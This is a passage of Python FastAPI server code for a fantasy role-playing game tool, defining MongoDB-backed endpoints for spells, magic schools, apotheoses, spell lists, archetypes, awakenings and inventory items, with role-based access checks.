          f"MP {old_mp} -> {cc['mp_cost']}, EN {old_en} -> {cc['en_cost']}, Category {old_cat} -> {cc['category']} (effects cleared)"
        )

    try:
        username, _ = require_auth(request, ["admin"])
    except Exception:
        username = "anonymous"
    try:
        write_audit("school.clear_effects", username, school_id, school, {
            "deleted_effects": eff_ids,
            "touched_spells": [sp.get("id") for sp in affected]
        })
    except Exception:
        pass

    return {
        "status":"success",
        "deleted_effects": len(eff_ids),
        "touched_spells": len(affected),
        "patch_text":"\n".join(lines) + "\n"
    }


@app.delete("/admin/schools/{school_id}")
def admin_delete_school(school_id: str, request: Request, force: bool = Query(default=False)):
    require_auth(request, ["admin", "moderator"])
    sch = get_col("schools")
    eff = get_col("effects")

    school = sch.find_one({"id": school_id}, {"_id": 0})
    if not school:
        return {"status":"error","message":"School not found"}

    used_count = eff.count_documents({"school": school_id})
    if used_count > 0 and not force:
        return {"status":"error","message":f"Cannot delete: {used_count} effect(s) still reference this school. Reassign or delete them first."}

    lines = [f"Deleted School [{school_id}] {school.get('name','')}",""]
    if used_count > 0 and force:
        eff_ids = [e["id"] for e in eff.find({"school": school_id}, {"_id":0,"id":1})]
        eff.delete_many({"school": school_id})
        from_ids = set(eff_ids)

        sp_col = get_col("spells")
        affected = list(sp_col.find({"effects": {"$in": list(from_ids)}}, {"_id": 0}))
        for sp in affected:
            new_effects = [eid for eid in (sp.get("effects") or []) if eid not in from_ids]

            old_mp, old_en = int(sp.get("mp_cost",0)), int(sp.get("en_cost",0))
            old_cat = sp.get("category","")

            cc = compute_spell_costs(
                sp.get("activation","Action"),
                int(sp.get("range",0)),
                sp.get("aoe","A Square"),
                int(sp.get("duration",1)),
                [str(x) for x in new_effects]
            )

            sp_col.update_one({"id": sp["id"]}, {"$set":{
                "effects": new_effects,
                "mp_cost": cc["mp_cost"],
                "en_cost": cc["en_cost"],
                "category": cc["category"]
            }})
            lines.append(
              f"[{sp['id']}] {sp.get('name','(unnamed)')}: "
              f"MP {old_mp} → {cc['mp_cost']}, EN {old_en} → {cc['en_cost']}, Category {old_cat} → {cc['category']} (effects removed with school)"
            )

    
    try:
        username, _ = require_auth(request, ["admin","moderator"])
    except Exception:
        username = "anonymous"
    try:
        _deleted_effects = []
        try:
            _deleted_effects = eff_ids
        except Exception:
            _deleted_effects = []
        _touched_spells = []
        try:
            _touched_spells = [sp.get("id") for sp in affected]
        except Exception:
            _touched_spells = []
        write_audit("school.delete", username, school_id, school, {"deleted": True, "deleted_effects": _deleted_effects, "touched_spells": _touched_spells, "force": bool(force)})
    except Exception:
        pass

    sch.delete_one({"id": school_id})
    return {"status":"success","deleted":school_id,"patch_text":"\n".join(lines) + "\n"}

# ---------- Apotheosis ----------
@app.get("/apotheosis/constraints")
def apo_list_constraints(request: Request, name: str | None = Query(default=None), category: str | None = Query(default=None)):
    require_auth(request, roles=["user","moderator","admin"])  # anyone logged-in can view
    q = {}
    if name:
        q["name"] = {"$regex": name, "$options": "i"}
    if category:
        q["category"] = {"$regex": category, "$options": "i"}
    docs = list(get_col("apotheosis_constraints").find(q, {"_id":0}))
    docs.sort(key=lambda d: d["name"].lower())
    return {"status":"success","constraints":docs}

@app.post("/apotheosis/constraints/bulk_create")
async def apo_constraints_bulk_create(request: Request):
    try:
        require_auth(request, roles=["moderator","admin"])
    except Exception as e:
        raise HTTPException(status_code=401, detail=str(e))
    body = await request.json()
    items = body.get("constraints") or []

    if not isinstance(items, list) or not items:
        return JSONResponse({"status":"error","message":"constraints must be a non-empty list"}, status_code=400)

    col = get_col("apotheosis_constraints")
    created = []
    for raw in items:
        name = (raw.get("name") or "").strip()
        if not name:
            return JSONResponse({"status":"error","message":"A constraint is missing a name"}, status_code=400)
        rec = {
            "id": next_id_str("apotheosis_constraints", padding=4),
            "name": name,
            "category": (raw.get("category") or "").strip(),
            "description": (raw.get("description") or "").strip(),
            "difficulty": int(raw.get("difficulty", 0)),
            "stability_delta": int(raw.get("stability_delta", 0)),
            "amplitude_bonus": int(raw.get("amplitude_bonus", 0)),
            "forbid_p2s": bool(raw.get("forbid_p2s", False)),
            "series_key": (raw.get("series_key") or "").strip(),
            "type_restriction": (raw.get("type_restriction") or "").strip(),
        }
        col.insert_one(rec)
        created.append(rec["id"])
    return {"status":"success","created":created}

@app.put("/apotheosis/constraints/{cid}")
async def apo_update_constraint(cid: str, request: Request):
    require_auth(request, roles=["moderator","admin"])
    body = await request.json()
    updates = {}
    for k in ("name","category","description","series_key","type_restriction"):
        if k in body: updates[k] = (body.get(k) or "").strip()
    for k in ("difficulty","stability_delta"):
        if k in body: updates[k] = int(body.get(k) or 0)
    if "forbid_p2s" in body: updates["forbid_p2s"] = bool(body.get("forbid_p2s"))
    r = get_col("apotheosis_constraints").update_one({"id": cid}, {"$set": updates})
    if r.matched_count == 0:
        return JSONResponse({"status":"error","message":"Constraint not found"}, status_code=404)
    return {"status":"success","id":cid,"updates":updates}

@app.delete("/apotheosis/constraints/{cid}")
def apo_delete_constraint(cid: str, request: Request):
    require_auth(request, roles=["moderator","admin"])
    get_col("apotheosis_constraints").delete_one({"id": cid})
    return {"status":"success","deleted":cid}

@app.post("/apotheosis/compute")
async def apo_compute(request: Request):
    body = await request.json()
    try:
        char_val = int(body.get("characteristic_value", 0))
    except Exception:
        return JSONResponse({"status":"error","message":"characteristic_value must be an integer"}, status_code=400)

    stage    = body.get("stage") or "Stage I"
    apo_type = body.get("type") or "Personal"
    constraints = [str(x).strip() for x in (body.get("constraints") or []) if str(x).strip()]
    p2s = int(body.get("trade_p2s", 0))
    p2a = int(body.get("trade_p2a", 0))
    s2a = int(body.get("trade_s2a", 0))

    stats = compute_apotheosis_stats(char_val, stage, apo_type, constraints, p2s, p2a, s2a)
    return {"status":"success", **stats}

@app.post("/apotheoses")
async def create_apotheosis(request: Request):
    username, _ = require_auth(request, roles=["user","moderator","admin"])
    body = await request.json()

    name = (body.get("name") or "Untitled Apotheosis").strip()
    desc = (body.get("description") or "").strip()
    apo_type = (body.get("type") or "Personal").strip()
    stage = (body.get("stage") or "Stage I").strip()
    characteristic_value = int(body.get("characteristic_value", 0))
    constraints = [str(x).strip() for x in (body.get("constraints") or []) if str(x).strip()]
    p2s = int(body.get("trade_p2s", 0)); p2a = int(body.get("trade_p2a", 0)); s2a = int(body.get("trade_s2a", 0))

    stats = compute_apotheosis_stats(characteristic_value, stage, apo_type, constraints, p2s, p2a, s2a)

    aid = next_id_str("apotheoses", padding=4)
    doc = {
        "id": aid,
        "name": name,
        "description": desc,
        "type": apo_type,
        "stage": stage,
        "characteristic_value": characteristic_value,
        "constraints": constraints,
        "trades": {"p2s": p2s, "p2a": p2a, "s2a": s2a},
        "stats": stats,
        "creator": username,
        "created_at": datetime.datetime.utcnow().isoformat() + "Z",
    }
    get_col("apotheoses").insert_one(dict(doc))
    return {"status":"success","apotheosis":doc}

@app.get("/apotheoses")
@app.get("/apotheoses")
def list_apotheoses(
    request: Request,
    name: str | None = Query(default=None),
    typ: str | None = Query(default=None),
    stage: str | None = Query(default=None),
    favorite: str | None = Query(default=None),
):
    # require auth; get identity and role
    username, role = require_auth(request, roles=["user","moderator","admin"])

    q: dict = {}
    if name:  q["name"]  = {"$regex": name, "$options": "i"}
    if typ:   q["type"]  = {"$regex": typ, "$options": "i"}
    if stage: q["stage"] = {"$regex": stage, "$options": "i"}

    # favorites filter (unchanged)
    fav_only = str(favorite or "").lower() in ("1","true","yes")
    if fav_only:
        user, _ = require_user_doc(request)
        fav = [str(x) for x in (user.get("fav_apotheoses") or [])]
        if not fav:
            return {"status":"success","apotheoses":[]}
        q["id"] = {"$in": fav}

    # visibility: only admins see all; everyone else sees only their own
    if role != "admin":
        q["creator"] = username

    docs = list(get_col("apotheoses").find(q, {"_id":0}))
    docs.sort(key=lambda d: d.get("name","").lower())
    return {"status":"success","apotheoses":docs}

@app.get("/apotheoses/{aid}")
def get_apotheosis(aid: str):
    doc = get_col("apotheoses").find_one({"id": aid}, {"_id":0})
    if not doc:
        raise HTTPException(404, "Apotheosis not found")
    return {"status":"success","apotheosis":doc}

@app.post("/apotheoses/{aid}/favorite")
def fav_apotheosis(aid: str, request: Request):
    user, _ = require_user_doc(request)
    get_col("users").update_one({"_id": user["_id"]}, {"$addToSet": {"fav_apotheoses": str(aid)}})
    return {"status":"success","id":aid,"action":"added"}

@app.delete("/apotheoses/{aid}/favorite")
def unfav_apotheosis(aid: str, request: Request):
    user, _ = require_user_doc(request)
    get_col("users").update_one({"_id": user["_id"]}, {"$pull": {"fav_apotheoses": str(aid)}})
    return {"status":"success","id":aid,"action":"removed"}

# --- Apotheoses: edit / delete / duplicate ---

@app.put("/apotheoses/{aid}")
async def update_apotheosis(aid: str, request: Request):
    username, role = require_auth(request, roles=["user", "moderator", "admin"])
    col = get_col("apotheoses")
    doc = col.find_one({"id": aid})
    if not doc:
        return JSONResponse({"status": "error", "message": "Not found"}, status_code=404)
    if not _can_edit_apotheosis(doc, username, role):
        return JSONResponse({"status": "error", "message": "Unauthorized"}, status_code=401)

    body = await request.json()
    updates = {}

    for k in ("name", "description", "type", "stage"):
        if k in body:
            v = body.get(k)
            updates[k] = v.strip() if isinstance(v, str) else v

    if "characteristic_value" in body:
        updates["characteristic_value"] = int(body.get("characteristic_value") or 0)
    if "constraints" in body:
        updates["constraints"] = [str(x).strip() for x in (body.get("constraints") or []) if str(x).strip()]

    trades = dict(doc.get("trades") or {})
    for k_in, k_tr in (("trade_p2s", "p2s"), ("trade_p2a", "p2a"), ("trade_s2a", "s2a")):
        if k_in in body:
            trades[k_tr] = int(body.get(k_in) or 0)
    if trades:
        updates["trades"] = trades

    from server.src.modules.apotheosis_helpers import compute_apotheosis_stats
    cv = updates.get("characteristic_value", doc.get("characteristic_value", 0))
    st = updates.get("stage", doc.get("stage", "Stage I"))
    tp = updates.get("type", doc.get("type", "Personal"))
    cs = updates.get("constraints", doc.get("constraints", []))
    tr = updates.get("trades", doc.get("trades", {}))
    stats = compute_apotheosis_stats(cv, st, tp, cs, int(tr.get("p2s", 0)), int(tr.get("p2a", 0)), int(tr.get("s2a", 0)))
    updates["stats"] = stats
    updates["updated_at"] = datetime.datetime.utcnow().isoformat() + "Z"

    col.update_one({"id": aid}, {"$set": updates})
    new_doc = col.find_one({"id": aid}, {"_id": 0})
    return {"status": "success", "apotheosis": new_doc}

@app.delete("/apotheoses/{aid}")
def delete_apotheosis(aid: str, request: Request):
    try:
        # Moderator (or admin) only
        require_auth(request, roles=["moderator", "admin"])
    except Exception as e:
        # Never leak an HTML 500; always JSON
        return JSONResponse({"status": "error", "message": str(e)}, status_code=401)

    r = get_col("apotheoses").delete_one({"id": aid})
    if r.deleted_count == 0:
        return JSONResponse({"status": "error", "message": "Not found"}, status_code=404)
    return {"status": "success", "deleted": aid}

@app.post("/apotheoses/{aid}/duplicate")
def duplicate_apotheosis(aid: str, request: Request):
    try:
        username, _ = require_auth(request, roles=["user", "moderator", "admin"])
    except Exception as e:
        return JSONResponse({"status": "error", "message": str(e)}, status_code=401)

    col = get_col("apotheoses")
    src = col.find_one({"id": aid}, {"_id": 0})
    if not src:
        return JSONResponse({"status": "error", "message": "Not found"}, status_code=404)

    new_id = next_id_str("apotheoses", padding=4)
    new_doc = dict(src)
    new_doc["id"] = new_id
    new_doc["name"] = f"{src.get('name','Untitled Apotheosis')} (copy)"
    new_doc["creator"] = username
    new_doc["created_at"] = datetime.datetime.utcnow().isoformat() + "Z"

    col.insert_one(dict(new_doc))
    return {"status": "success", "apotheosis": new_doc}

@app.put("/apotheoses/{aid}")
async def update_apotheosis(aid: str, request: Request):
    username, role = require_auth(request, roles=["user","moderator","admin"])
    col = get_col("apotheoses")
    doc = col.find_one({"id": aid})
    if not doc:
        return JSONResponse({"status":"error","message":"Not found"}, status_code=404)
    if not (doc.get("creator")==username or role in ("moderator","admin")):
        return JSONResponse({"status":"error","message":"Forbidden"}, status_code=403)

    body = await request.json()
    updates = {}

    for k in ("name","description","type","stage"):
        if k in body:
            v = body.get(k)
            updates[k] = v.strip() if isinstance(v,str) else v

    if "characteristic_value" in body:
        updates["characteristic_value"] = int(body.get("characteristic_value") or 0)
    if "constraints" in body:
        updates["constraints"] = [str(x).strip() for x in (body.get("constraints") or []) if str(x).strip()]

    trades = dict(doc.get("trades") or {})
    for k_in, k_tr in (("trade_p2s","p2s"),("trade_p2a","p2a"),("trade_s2a","s2a")):
        if k_in in body:
            trades[k_tr] = int(body.get(k_in) or 0)
    if trades: updates["trades"] = trades

    # recompute stats
    from server.src.modules.apotheosis_helpers import compute_apotheosis_stats
    cv = updates.get("characteristic_value", doc.get("characteristic_value", 0))
    st = updates.get("stage", doc.get("stage", "Stage I"))
    tp = updates.get("type", doc.get("type", "Personal"))
    cs = updates.get("constraints", doc.get("constraints", []))
    tr = updates.get("trades", doc.get("trades", {}))
    stats = compute_apotheosis_stats(cv, st, tp, cs, int(tr.get("p2s",0)), int(tr.get("p2a",0)), int(tr.get("s2a",0)))
    updates["stats"] = stats
    updates["updated_at"] = datetime.datetime.utcnow().isoformat()+"Z"

    col.update_one({"id": aid}, {"$set": updates})
    new_doc = col.find_one({"id": aid}, {"_id":0})
    return {"status":"success","apotheosis": new_doc}

# ---------- Spell Lists ----------
def _can_access_list(doc, username, role):
    return (doc and (doc.get("owner") == username or role in ("admin","moderator")))

def _can_view_list(doc, username, role):
    if _can_access_list(doc, username, role):
        return True
    if doc and _public_character_ref("spell_list_id", doc.get("id")):
        return True
    return False

@app.post("/spell_lists")
async def create_spell_list(request: Request):
    username, _ = require_auth(request, roles=["user","moderator","admin"])
    body = await request.json()
    name = (body.get("name") or "Untitled List").strip()
    sl_id = next_id_str("spell_lists", padding=4)

    iv_in = body.get("initial_values") or {}
    iv = {
        "mag": int(iv_in.get("mag") or 0),
        "natures": {k: int((iv_in.get("natures") or {}).get(k, 0) or 0)
                    for k in ("fire","water","wind","earth","sun","moon","lightning","ki")},
        "skills": {k: int((iv_in.get("skills") or {}).get(k, 0) or 0)
                   for k in ("aura","incantation","enchantement","potential","restoration","stealth","investigation","charm","intimidation","absorption","spirit")},
    }

    doc = {
        "id": sl_id,
        "name": name,
        "owner": username,
        "created_at": datetime.datetime.utcnow().isoformat() + "Z",
        "initial_values": iv,
        "spells": [],
    }
    get_col("spell_lists").insert_one(dict(doc))
    return {"status":"success","list":doc}

@app.get("/spell_lists/mine")
def my_spell_lists(request: Request):
    username, _ = require_auth(request, roles=["user","moderator","admin"])
    docs = list(get_col("spell_lists").find({"owner": username}, {"_id":0}))
    docs.sort(key=lambda d: d.get("created_at",""))
    return {"status":"success","lists":docs}

@app.get("/spell_lists/{list_id}")
def get_spell_list(list_id: str, request: Request):
    username, role = _optional_auth(request)
    doc = get_col("spell_lists").find_one({"id": list_id}, {"_id":0})
    if not _can_view_list(doc, username, role):
        raise HTTPException(status_code=401, detail="Unauthorized")
    return {"status":"success","list":doc}

@app.put("/spell_lists/{list_id}")
async def update_spell_list(list_id: str, request: Request):
    username, role = require_auth(request, roles=["user","moderator","admin"])
    body = await request.json()
    col = get_col("spell_lists")
    doc = col.find_one({"id": list_id})
    if not _can_access_list(doc, username, role):
        raise HTTPException(status_code=401, detail="Unauthorized")

    updates = {}
    if "name" in body:
        updates["name"] = (body.get("name") or "").strip()
    if "initial_values" in body:
        iv = body.get("initial_values") or {}
        iv["mag"] = int(iv.get("mag") or 0)
        iv["natures"] = {k:int(iv.get("natures",{}).get(k,0) or 0) for k in ("fire","water","wind","earth","sun","moon","lightning","ki")}
        iv["skills"]  = {k:int(iv.get("skills",{}).get(k,0) or 0)  for k in ("aura","incantation","enchantement","potential","restoration","stealth","investigation","charm","intimidation","absorption","spirit")}
        updates["initial_values"] = iv

    if not updates:
        return {"status":"success","list": {k:v for k,v in doc.items() if k!="_id"}}

    col.update_one({"id": list_id}, {"$set": updates})
    new_doc = col.find_one({"id": list_id}, {"_id":0})
    return {"status":"success","list": new_doc}

@app.post("/spell_lists/{list_id}/duplicate")
def duplicate_spell_list(list_id: str, request: Request):
    username, role = require_auth(request, roles=["user","moderator","admin"])
    col = get_col("spell_lists")
    doc = col.find_one({"id": list_id})
    if not _can_access_list(doc, username, role):
        raise HTTPException(status_code=401, detail="Unauthorized")
    base_name = (doc.get("name") or "Spell List").strip() or "Spell List"
    new_id = next_id_str("spell_lists", padding=4)
    now = datetime.datetime.utcnow().isoformat() + "Z"
    dup = {k: v for k, v in doc.items() if k != "_id"}
    dup["id"] = new_id
    dup["name"] = f"{base_name} (copy)"
    dup["owner"] = username
    dup["created_at"] = now
    dup["updated_at"] = now
    col.insert_one(dict(dup))
    return {"status":"success","list": {k:v for k,v in dup.items() if k!="_id"}}

@app.get("/spell_lists/{list_id}/spells")
def spell_list_spells(list_id: str, request: Request):
    username, role = _optional_auth(request)
    sl = get_col("spell_lists").find_one({"id": list_id}, {"_id":0})
    if not _can_view_list(sl, username, role):
        raise HTTPException(status_code=401, detail="Unauthorized")
    ids = [str(x) for x in (sl.get("spells") or [])]
    if not ids:
        return {"status":"success","spells":[]}
    sp_col  = get_col("spells")
    eff_col = get_col("effects")
    sch_col = get_col("schools")
    spells = list(sp_col.find({"id": {"$in": ids}}, {"_id":0}))
    school_map = {s["id"]: s.get("name", s["id"]) for s in sch_col.find({}, {"_id":0,"id":1,"name":1})}
    all_eff_ids = {str(eid) for sp in spells for eid in (sp.get("effects") or [])}
    eff_docs = list(eff_col.find({"id": {"$in": list(all_eff_ids)}}, {"_id":0}))
    eff_school = {d["id"]: str(d.get("school") or "") for d in eff_docs}
    eff_by_id = {d["id"]: d for d in eff_docs}
    out = []
    for sp in spells:
        sch_ids = sorted({eff_school.get(str(eid), "") for eid in (sp.get("effects") or []) if eff_school.get(str(eid), "")})
        sp["schools"] = [{"id": sid, "name": school_map.get(sid, sid)} for sid in sch_ids]
        sp["effects_detail"] = [eff_by_id.get(str(eid)) for eid in (sp.get("effects") or []) if eff_by_id.get(str(eid))]
        out.append(sp)
    return {"status":"success","spells": out}

@app.post("/spell_lists/{list_id}/spells")
async def add_spells_to_list(list_id: str, request: Request):
    username, role = require_auth(request, roles=["user","moderator","admin"])
    body = await request.json()
    ids = body.get("ids") or ([body.get("id")] if body.get("id") else [])
    ids = [str(i).strip() for i in ids if str(i).strip()]
    if not ids:
        return JSONResponse({"status":"error","message":"Provide id or ids"}, status_code=400)

    col = get_col("spell_lists")
    sl = col.find_one({"id": list_id})
    if not _can_access_list(sl, username, role):
        raise HTTPException(status_code=401, detail="Unauthorized")

    existing = set(str(s["id"]) for s in get_col("spells").find({"id": {"$in": ids}}, {"_id":0,"id":1}))
    missing = [i for i in ids if i not in existing]
    if missing:
        return JSONResponse({"status":"error","message":f"Unknown spell id(s): {', '.join(missing)}"}, status_code=400)

    new_list = list({*(str(x) for x in (sl.get("spells") or [])), *existing})
    col.update_one({"id": list_id}, {"$set": {"spells": new_list}})
    return {"status":"success","added": list(existing), "total": len(new_list)}

@app.delete("/spell_lists/{list_id}/spells/{spell_id}")
def remove_spell_from_list(list_id: str, spell_id: str, request: Request):
    username, role = require_auth(request, roles=["user","moderator","admin"])
    col = get_col("spell_lists")
    sl = col.find_one({"id": list_id})
    if not _can_access_list(sl, username, role):
        raise HTTPException(status_code=401, detail="Unauthorized")
    col.update_one({"id": list_id}, {"$pull": {"spells": str(spell_id)}})
    return {"status":"success","removed": str(spell_id)}

@app.delete("/spell_lists/{list_id}")
def delete_spell_list(list_id: str, request: Request):
    username, role = require_auth(request, roles=["user","moderator","admin"])
    col = get_col("spell_lists")
    doc = col.find_one({"id": list_id})
    if not _can_access_list(doc, username, role):
        raise HTTPException(status_code=401, detail="Unauthorized")
    col.delete_one({"id": list_id})
    return {"status": "success", "deleted": list_id}

@app.get("/archetypes")
def list_archetypes(request: Request):
    docs = list(get_col("archetypes").find({}, {"_id":0}))
    docs.sort(key=lambda d: d.get("name",""))
    return {"status":"success","archetypes": docs}

@app.post("/archetypes")
async def create_archetype(request: Request):
    username, role = require_auth(request, roles=["user","moderator","admin"])
    body = await request.json()
    doc = _validate_archetype_doc(body or {})
    if role not in ("moderator","admin"):
        pending = _create_pending_submission(username, role, "archetype", doc)
        return {"status":"pending","submission": pending}
    doc["id"] = next_id_str("archetypes", padding=4)
    doc["created_at"] = _now_iso()
    doc["updated_at"] = doc["created_at"]
    get_col("archetypes").insert_one(dict(doc))
    return {"status":"success","archetype": {k:v for k,v in doc.items() if k!="_id"}}

@app.get("/archetypes/{aid}")
def get_archetype(aid: str, request: Request):
    doc = get_col("archetypes").find_one({"id": aid}, {"_id":0})
    if not doc:
        raise HTTPException(404, "Archetype not found")
    return {"status":"success","archetype": doc}

@app.put("/archetypes/{aid}")
async def update_archetype(aid: str, request: Request):
    require_auth(request, roles=["moderator","admin"])
    body = await request.json()
    doc = get_col("archetypes").find_one({"id": aid})
    if not doc:
        raise HTTPException(404, "Archetype not found")
    new_doc = _validate_archetype_doc(body or {}, is_update=True)
    new_doc["updated_at"] = datetime.datetime.utcnow().isoformat()+"Z"
    get_col("archetypes").update_one({"id": aid}, {"$set": new_doc})
    out = get_col("archetypes").find_one({"id": aid}, {"_id":0})
    return {"status":"success","archetype": out}

@app.delete("/archetypes/{aid}")
def delete_archetype(aid: str, request: Request):
    require_auth(request, roles=["admin"])
    res = get_col("archetypes").delete_one({"id": aid})
    if res.deleted_count == 0:
        raise HTTPException(404, "Archetype not found")
    return {"status":"success","deleted": aid}

@app.get("/expertise")
def list_expertise(request: Request):
    docs = list(get_col("expertise").find({}, {"_id":0}))
    docs.sort(key=lambda d: d.get("name",""))
    return {"status":"success","expertises": docs}

@app.post("/expertise")
async def create_expertise(request: Request):
    username, role = require_auth(request, roles=["user","moderator","admin"])
    body = await request.json()
    doc = _validate_expertise_doc(body or {})
    if role not in ("moderator","admin"):
        pending = _create_pending_submission(username, role, "expertise", doc)
        return {"status":"pending","submission": pending}
    doc["id"] = next_id_str("expertise", padding=4)
    doc["created_at"] = _now_iso()
    doc["updated_at"] = doc["created_at"]
    get_col("expertise").insert_one(dict(doc))
    return {"status":"success","expertise": {k:v for k,v in doc.items() if k!="_id"}}

@app.get("/expertise/{eid}")
def get_expertise(eid: str, request: Request):
    doc = get_col("expertise").find_one({"id": eid}, {"_id":0})
    if not doc:
        raise HTTPException(404, "Expertise not found")
    return {"status":"success","expertise": doc}

@app.put("/expertise/{eid}")
async def update_expertise(eid: str, request: Request):
    require_auth(request, roles=["moderator","admin"])
    body = await request.json()
    doc = get_col("expertise").find_one({"id": eid})
    if not doc:
        raise HTTPException(404, "Expertise not found")
    new_doc = _validate_expertise_doc(body or {}, is_update=True)
    new_doc["updated_at"] = datetime.datetime.utcnow().isoformat()+"Z"
    get_col("expertise").update_one({"id": eid}, {"$set": new_doc})
    out = get_col("expertise").find_one({"id": eid}, {"_id":0})
    return {"status":"success","expertise": out}

@app.delete("/expertise/{eid}")
def delete_expertise(eid: str, request: Request):
    require_auth(request, roles=["admin"])
    res = get_col("expertise").delete_one({"id": eid})
    if res.deleted_count == 0:
        raise HTTPException(404, "Expertise not found")
    return {"status":"success","deleted": eid}

@app.get("/divine_manifestations")
def list_divine_manifestations(request: Request):
    docs = list(get_col("divine_manifestations").find({}, {"_id":0}))
    docs.sort(key=lambda d: d.get("name",""))
    return {"status":"success","divine_manifestations": docs}

@app.post("/divine_manifestations")
async def create_divine_manifestation(request: Request):
    username, role = require_auth(request, roles=["user","moderator","admin"])
    body = await request.json()
    doc = _validate_divine_manifestation_doc(body or {})
    if role not in ("moderator","admin"):
        pending = _create_pending_submission(username, role, "divine_manifestation", doc)
        return {"status":"pending","submission": pending}
    doc["id"] = next_id_str("divine_manifestations", padding=4)
    doc["created_at"] = _now_iso()
    doc["updated_at"] = doc["created_at"]
    get_col("divine_manifestations").insert_one(dict(doc))
    return {"status":"success","divine_manifestation": {k:v for k,v in doc.items() if k!="_id"}}

@app.get("/divine_manifestations/{did}")
def get_divine_manifestation(did: str, request: Request):
    doc = get_col("divine_manifestations").find_one({"id": did}, {"_id":0})
    if not doc:
        raise HTTPException(404, "Divine Manifestation not found")
    return {"status":"success","divine_manifestation": doc}

@app.put("/divine_manifestations/{did}")
async def update_divine_manifestation(did: str, request: Request):
    require_auth(request, roles=["moderator","admin"])
    body = await request.json()
    doc = get_col("divine_manifestations").find_one({"id": did})
    if not doc:
        raise HTTPException(404, "Divine Manifestation not found")
    new_doc = _validate_divine_manifestation_doc(body or {}, is_update=True)
    new_doc["updated_at"] = datetime.datetime.utcnow().isoformat()+"Z"
    get_col("divine_manifestations").update_one({"id": did}, {"$set": new_doc})
    out = get_col("divine_manifestations").find_one({"id": did}, {"_id":0})
    return {"status":"success","divine_manifestation": out}

@app.delete("/divine_manifestations/{did}")
def delete_divine_manifestation(did: str, request: Request):
    require_auth(request, roles=["admin"])
    res = get_col("divine_manifestations").delete_one({"id": did})
    if res.deleted_count == 0:
        raise HTTPException(404, "Divine Manifestation not found")
    return {"status":"success","deleted": did}

@app.get("/awakenings")
def list_awakenings(request: Request):
    docs = list(get_col("awakenings").find({}, {"_id":0}))
    docs.sort(key=lambda d: d.get("name",""))
    return {"status":"success","awakenings": docs}

@app.post("/awakenings")
async def create_awakening(request: Request):
    username, role = require_auth(request, roles=["user","moderator","admin"])
    body = await request.json()
    doc = _validate_awakening_doc(body or {})
    if role not in ("moderator","admin"):
        pending = _create_pending_submission(username, role, "awakening", doc)
        return {"status":"pending","submission": pending}
    doc["id"] = next_id_str("awakenings", padding=4)
    doc["created_at"] = _now_iso()
    doc["updated_at"] = doc["created_at"]
    get_col("awakenings").insert_one(dict(doc))
    return {"status":"success","awakening": {k:v for k,v in doc.items() if k!="_id"}}

@app.get("/awakenings/{aid}")
def get_awakening(aid: str, request: Request):
    doc = get_col("awakenings").find_one({"id": aid}, {"_id":0})
    if not doc:
        raise HTTPException(404, "Awakening not found")
    return {"status":"success","awakening": doc}

@app.put("/awakenings/{aid}")
async def update_awakening(aid: str, request: Request):
    require_auth(request, roles=["moderator","admin"])
    body = await request.json()
    doc = get_col("awakenings").find_one({"id": aid})
    if not doc:
        raise HTTPException(404, "Awakening not found")
    new_doc = _validate_awakening_doc(body or {}, is_update=True)
    new_doc["updated_at"] = datetime.datetime.utcnow().isoformat()+"Z"
    get_col("awakenings").update_one({"id": aid}, {"$set": new_doc})
    out = get_col("awakenings").find_one({"id": aid}, {"_id":0})
    return {"status":"success","awakening": out}

@app.delete("/awakenings/{aid}")
def delete_awakening(aid: str, request: Request):
    require_auth(request, roles=["admin"])
    res = get_col("awakenings").delete_one({"id": aid})
    if res.deleted_count == 0:
        raise HTTPException(404, "Awakening not found")
    return {"status":"success","deleted": aid}

if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=8000)

# ---------- Objects (inventory) ----------
@app.get("/objects")
def list_objects(q: str | None = Query(None)):
    col = get_col("objects")
    filt = {}
    if q:
        filt["name_key"] = {"$regex": norm_key(q)}
    return {"status": "success", "objects": list(col.find(filt, {"_id": 0}))}

@app.post("/objects")
def create_object(request: Request, body: dict = Body(...)):
    username, role = require_auth(request, roles=["user","moderator","admin"])
    col = get_col("objects")
    doc = _object_from_body(body)
    if role not in ("moderator","admin"):
        pending = _create_pending_submission(username, role, "item", doc, kind="object")
        return {"status":"pending","submission": pending}
    doc["id"] = next_id_str("objects", padding=4)
    doc["created_at"] = _now_iso()
    col.insert_one(dict(doc))
    return {"status": "success", "object": {k:v for k,v in doc.items() if k != "_id"}}

@app.put("/objects/{oid}")
def update_object(oid: str, request: Request, body: dict = Body(...)):
    username, role = require_auth(request, roles=["moderator","admin"])
    col = get_col("objects")
    old = col.find_one({"id": oid})
    if not old:
        raise HTTPException(status_code=404, detail="Not found")
    upd = _object_from_body(body)
    upd["updated_at"] = datetime.datetime.utcnow().isoformat() + "Z"
    col.update_one({"id": oid}, {"$set": upd})
    new = col.find_one({"id": oid}, {"_id": 0})
    return {"status": "success", "object": new}

@app.delete("/objects/{oid}")
def delete_object(oid: str, request: Request):
    username, role = require_auth(request, roles=["moderator","admin"])
    col = get_col("objects")
    r = col.delete_one({"id": oid})
    if r.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Not found")
    return {"status": "success", "deleted": oid}

@app.post("/objects/bulk_create")
def bulk_create_objects(request: Request, payload: dict = Body(...)):
    username, role = require_auth(request, roles=["moderator","admin"])
    items = payload.get("items") or []
    if not isinstance(items, list) or not items:
        raise HTTPException(status_code=400, detail="items must be a non-empty list")

    col = get_col("objects")
    created = []
    for b in items:
        doc = _object_from_body(b)
        doc["id"] = next_id_str("objects", padding=4)
        doc["created_at"] = datetime.datetime.utcnow().isoformat() + "Z"
        col.insert_one(dict(doc))
        created.append({k:v for k,v in doc.items() if k != "_id"})

    return {"status":"success","created": created}

# ---------- Tools (inventory) ----------
from fastapi import Body
import gridfs
from bson import ObjectId

_TIER_TABLE = {
    "1": {"price": 50, "dc": 6, "time": "1 hour"},
    "2": {"price": 100, "dc": 8, "time": "1 hour"},
    "3": {"price": 200, "dc": 10, "time": "1 hour"},
    "4": {"price": 1000, "dc": 12, "time": "2 hours"},
    "5": {"price": 2000, "dc": 14, "time": "3 hours"},
    "special": {"price": 10000, "dc": 16, "time": "6 hours"},
}
def _tier_key(tier: str | int) -> str:
    s = str(tier).strip().lower()
    if s in _TIER_TABLE: return s
    try:
        n = int(float(s))
        return str(n) if str(n) in _TIER_TABLE else "special"
    except Exception:
        return "special"

def _derive_for(method: str, tier: str | int) -> dict:
    key = _tier_key(tier)
    base = _TIER_TABLE[key]
    # label differs, values same
    return {
        "price": base["price"],
        "creation_time": base["time"],
        ("alchemy_dc" if method == "alchemy" else "crafting_dc"): base["dc"],
    }

